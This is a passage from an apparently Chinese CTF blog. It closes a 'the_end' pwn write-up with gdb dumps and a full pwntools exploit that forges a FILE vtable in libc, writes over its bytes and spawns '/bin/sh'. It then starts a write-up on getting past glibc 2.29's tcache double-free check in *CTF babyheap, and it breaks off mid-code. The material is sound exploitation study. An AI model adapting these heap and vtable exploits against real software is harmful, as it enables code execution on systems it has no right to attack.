附近伪造一个 <code>fake_vtable</code> ，然后使用 3 个字节修改 <code>fake_vtable</code> 中 <code>_setbuf</code> 的内容为 <code>one_gadget</code>。</li></ul><p>我们先调试找出 <code>_IO_2_1_stdout_</code> 和 libc 的偏移，这里很蠢的地方是我最初是在 gdb 中搜索相关符号，但是其实找出的地址是 <code>_IO_2_1_stdout_</code> 这个符号所在的位置，而不是其在 libc 数据段上的位置，我们借助 ida 或者 libcsearch 工具找出 <code>vtables</code> 偏移 <code>0x3C56F8</code> 如下：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201208173345.png" alt="image-20201208173345652"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00000000003</span>C56F8                 dq offset _IO_file_jumps  <span class="comment">// vtables</span></span><br><span class="line">.data:<span class="number">00000000003</span>C5700                 <span class="keyword">public</span> <span class="built_in">stderr</span></span><br><span class="line">.data:<span class="number">00000000003</span>C5700 <span class="built_in">stderr</span>          dq offset _IO_2_1_stderr_</span><br><span class="line">.data:<span class="number">00000000003</span>C5700                                         ; DATA XREF: LOAD:<span class="number">000000000000B</span>AF0↑o</span><br><span class="line">.data:<span class="number">00000000003</span>C5700                                         ; fclose+F2↑r ...</span><br><span class="line">.data:<span class="number">00000000003</span>C5708                 <span class="keyword">public</span> <span class="built_in">stdout</span></span><br><span class="line">.data:<span class="number">00000000003</span>C5708 <span class="built_in">stdout</span>          dq offset _IO_2_1_stdout_</span><br><span class="line">.data:<span class="number">00000000003</span>C5708                                         ; DATA XREF: LOAD:<span class="number">0000000000009F</span>48↑o</span><br><span class="line">.data:<span class="number">00000000003</span>C5708                                         ; fclose+E9↑r ...</span><br><span class="line">.data:<span class="number">00000000003</span>C5710                 <span class="keyword">public</span> <span class="built_in">stdin</span></span><br><span class="line">.data:<span class="number">00000000003</span>C5710 <span class="built_in">stdin</span>           dq offset _IO_2_1_stdin_</span><br><span class="line">.data:<span class="number">00000000003</span>C5710                                         ; DATA XREF: LOAD:<span class="number">0000000000006</span>DF8↑o</span><br><span class="line">.data:<span class="number">00000000003</span>C5710                                         ; fclose:loc_6D340↑r ...</span><br><span class="line">.data:<span class="number">00000000003</span>C5718                 dq offset sub_20B70</span><br><span class="line">.data:<span class="number">00000000003</span>C5718 _data           ends</span><br><span class="line">.data:<span class="number">00000000003</span>C5718</span><br><span class="line">.bss:<span class="number">00000000003</span>C5720 ; ===========================================================================</span><br></pre></td></tr></table></figure><p>我们查看下虚表内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">30</span>gx <span class="number">0x7f41d9c026f8</span></span><br><span class="line"><span class="number">0x7f41d9c026f8</span> &lt;_IO_2_1_stdout_+<span class="number">216</span>&gt;:   <span class="number">0x00007f41d9c006e0</span>  <span class="number">0x00007f41d9c02540</span></span><br><span class="line"><span class="number">0x7f41d9c02708</span> &lt;<span class="built_in">stdout</span>&gt;:    <span class="number">0x00007f41d9c02620</span>  <span class="number">0x00007f41d9c018e0</span></span><br><span class="line"><span class="number">0x7f41d9c02718</span> &lt;DW.ref.__gcc_personality_v0&gt;:   <span class="number">0x00007f41d985db70</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c02728</span> &lt;string_space&gt;:  <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c02738</span> &lt;__printf_va_arg_table&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c02748</span> &lt;transitions&gt;:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c02758</span> &lt;buffer&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c02768</span> &lt;buffer&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c02778</span> &lt;buffer&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c02788</span> &lt;buffer&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c02798</span> &lt;getttyname_name&gt;:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c027a8</span> &lt;fcvt_bufptr&gt;:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c027b8</span> &lt;buffer&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c027c8</span> &lt;buffer&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f41d9c027d8</span> &lt;buffer&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>然后此时在虚表附近寻找一个 <code>fake_vtable</code>，需满足以下条件：</p><ul><li><code>fake_vtable_addr</code> + 0x58 = <code>libc_base</code> + <code>off_set_3</code></li><li>其中 0x58 根据下表查处是 <code>set_buf</code> 在虚表的偏移</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line"><span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// &quot;extra word&quot;</span></span><br><span class="line"><span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line"><span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line"><span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line"><span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line"><span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line"><span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line"><span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn #printf</span></span><br><span class="line"><span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line"><span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line"><span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line"><span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line"><span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line"><span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line"><span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line"><span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line"><span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line"><span class="number">18</span> pwn, <span class="comment">// close</span></span><br><span class="line"><span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line"><span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line"><span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我这里选择了以下地址作为 <code>fake_vtable</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;60gx 0x7f41d9c02500</span><br><span class="line">0x7f41d9c02500 &lt;_nl_global_locale+224&gt;: 0x00007f41d99cb997  0x0000000000000000</span><br><span class="line">0x7f41d9c02510: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c02520 &lt;_IO_list_all&gt;:  0x00007f41d9c02540  0x0000000000000000</span><br><span class="line">0x7f41d9c02530: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c02540 &lt;_IO_2_1_stderr_&gt;:   0x00000000fbad2086  0x0000000000000000</span><br><span class="line">0x7f41d9c02550 &lt;_IO_2_1_stderr_+16&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c02560 &lt;_IO_2_1_stderr_+32&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c02570 &lt;_IO_2_1_stderr_+48&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c02580 &lt;_IO_2_1_stderr_+64&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c02590 &lt;_IO_2_1_stderr_+80&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c025a0 &lt;_IO_2_1_stderr_+96&gt;:    0x0000000000000000  0x00007f41d9c02620</span><br><span class="line">0x7f41d9c025b0 &lt;_IO_2_1_stderr_+112&gt;:   0x0000000000000002  0xffffffffffffffff</span><br><span class="line">0x7f41d9c025c0 &lt;_IO_2_1_stderr_+128&gt;:   0x0000000000000000  0x00007f41d9c03770</span><br><span class="line">0x7f41d9c025d0 &lt;_IO_2_1_stderr_+144&gt;:   0xffffffffffffffff  0x0000000000000000</span><br><span class="line">0x7f41d9c025e0 &lt;_IO_2_1_stderr_+160&gt;:   0x00007f41d9c01660  0x0000000000000000</span><br><span class="line">0x7f41d9c025f0 &lt;_IO_2_1_stderr_+176&gt;:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c02600 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c02610 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000  0x00007f41d9c006e0</span><br><span class="line">0x7f41d9c02620 &lt;_IO_2_1_stdout_&gt;:   0x00000000fbad2a84  0x00005582e351c010</span><br><span class="line">0x7f41d9c02630 &lt;_IO_2_1_stdout_+16&gt;:    0x00005582e351c010  0x00005582e351c010</span><br><span class="line">0x7f41d9c02640 &lt;_IO_2_1_stdout_+32&gt;:    0x00005582e351c010  0x00005582e351c010</span><br><span class="line">0x7f41d9c02650 &lt;_IO_2_1_stdout_+48&gt;:    0x00005582e351c010  0x00005582e351c010</span><br><span class="line">0x7f41d9c02660 &lt;_IO_2_1_stdout_+64&gt;:    0x00005582e351c410  0x0000000000000000</span><br><span class="line">0x7f41d9c02670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7f41d9c02680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000  0x00007f41d9c018e0</span><br><span class="line">0x7f41d9c02690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001  0xffffffffffffffff</span><br><span class="line">0x7f41d9c026a0 &lt;_IO_2_1_stdout_+128&gt;:   0x0000000000000000  0x00007f41d9c03780</span><br><span class="line">0x7f41d9c026b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff  0x0000000000000000</span><br><span class="line">0x7f41d9c026c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007f41d9c017a0  0x0000000000000000</span><br><span class="line">0x7f41d9c026d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000  0x0000000000000000</span><br><span class="line">pwndbg&gt; distance 0x7f41d9c025e0 0x7f41d983d000</span><br><span class="line">0x7f41d9c025e0-&gt;0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words)</span><br><span class="line">pwndbg&gt; p 0x7f41d9c025e0 -0x58</span><br><span class="line">$10 &#x3D; 0x7f41d9c02588</span><br><span class="line">pwndbg&gt; distance 0x7f41d9c02588 0x7f41d983d000</span><br><span class="line">0x7f41d9c02588-&gt;0x7f41d983d000 is -0x3c5588 bytes (-0x78ab1 words)</span><br><span class="line">pwndbg&gt; distance  0x7f41d9c025e0 0x7f41d983d000</span><br><span class="line">0x7f41d9c025e0-&gt;0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words)</span><br></pre></td></tr></table></figure><p>最终的利用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;gift &quot;</span>)</span><br><span class="line">sleep_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = sleep_addr-libc.sym[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">vtables = libc_base+<span class="number">0x3C56F8</span><span class="comment">#libc.sym[&#x27;_IO_file_jumps&#x27;]</span></span><br><span class="line">log.info(<span class="string">&quot;vtables:&quot;</span>+<span class="built_in">hex</span>(vtables))</span><br><span class="line">one_gadget = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#0x45226</span></span><br><span class="line"></span><br><span class="line">fake_vtable = libc_base + <span class="number">0x3c5588</span></span><br><span class="line">target_addr = libc_base + <span class="number">0x3c55e0</span></span><br><span class="line">log.info(<span class="string">&quot;fake_vtable:&quot;</span>+<span class="built_in">hex</span>(fake_vtable))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    p.send(p64(vtables+i))</span><br><span class="line">    p.send(p64(fake_vtable)[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.send(p64(target_addr+i))</span><br><span class="line">    p.send(p64(one_gadget)[i])</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="archives/0/"/>
      <url>archives/0/</url>
      
        <content type="html"><![CDATA[<h1 id="libc2-29-tcache-doublefree"><a href="#libc2-29-tcache-doublefree" class="headerlink" title="libc2.29_tcache_doublefree"></a>libc2.29_tcache_doublefree</h1><p>* CTF上遇到的题目。给的是最新版的 libc2.27 ，新增了在 libc2.29 上的 tcache double free 检测。</p><h2 id="tcache-新增防护机制"><a href="#tcache-新增防护机制" class="headerlink" title="tcache 新增防护机制"></a>tcache 新增防护机制</h2><h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><p>Tcache_entry 结构体新增了指针 key 放在 bk 位，作用是检测 tcache double free ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用 tcache_put() 放堆进 tcache bin 时，tcache_perthread_struct 地址被写入 e-&gt;key ，即 tcache 结构体堆地址写入释放堆的 bk 位：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;<span class="comment">//写入tcache_perthread_struct地址</span></span><br><span class="line"><span class="comment">//定义：static __thread tcache_perthread_struct *tcache = NULL;</span></span><br><span class="line">  </span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>用 tcache_get() 取 bin 中堆时，将该区域置零：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="_images/libc2.29_tcache_doublefree/image-20210118140803215.png" alt="image-20210118140803215"></p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>free() 函数中检查：检测 <code>e-&gt;key == tcache</code> ，如果满足条件就遍历 tcache 查看是否有相同堆块，有则弹出错误 <code>free(): double free detected in tcache 2</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><blockquote><p>FROM:<a href="https://xz.aliyun.com/t/7292">tcache poisoning在glibc2.29中的利用小结 - 先知社区</a></p></blockquote><p>新增保护主要还是用到<code>e-&gt;key</code>这个属性，因此绕过想绕过检测进行 double free ，这里也是入手点。</p><p>绕过思路有以下两个：</p><ol><li><p>使 <code>e-&gt;key</code> 失效（置零）：</p><p>如果有UAF漏洞或堆溢出，可以修改<code>e-&gt;key</code>为空，或者其他非<code>tcache_perthread_struct</code>的地址。这样可以直接绕过<code>_int_free</code>里面第一个if判断。不过如果UAF或堆溢出能直接修改chunk的fd的话，根本就不需要用到double free了。</p></li><li><p>使检测机制发生错误：</p><p>利用堆溢出，修改chunk的size，最差的情况至少要做到 off by null 。留意到<code>_int_free</code>里面判断当前chunk是否已存在 tcache 的地方，它是根据 chunk 的大小去查指定的 tcache 链，由于我们修改了 chunk 的 size ，查找 tcache 链时并不会找到该 chunk ，满足 free 的条件。虽然 double free 的 chunk 不在同一个 tcache 链中，不过不影响我们使用 tcache poisoning 进行攻击。</p></li></ol><h2 id="CTF-babyheap"><a href="#CTF-babyheap" class="headerlink" title="*CTF babyheap"></a>*CTF babyheap</h2><p>程序 delete 函数 UAF ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index&quot;</span>);</span><br><span class="line">  v0 = readInt();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; <span class="number">0</span> || v0 &gt; <span class="number">15</span> || !pools[v0] )        <span class="comment">// 存在指针</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;bye!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)pools[v0]);                      <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制堆大小在 0xF~0x60 范围，提供一次申请&amp;写入 0x400 的机会。一开始用这个 0x400 只是泄露地址，后续因为无法控制 tcachebin 的 fd 指针，而无法进行下去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index&quot;</span>);</span><br><span class="line">  index = readInt();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">15</span> || !pools[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;bye!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input content&quot;</span>);</span><br><span class="line">  <span 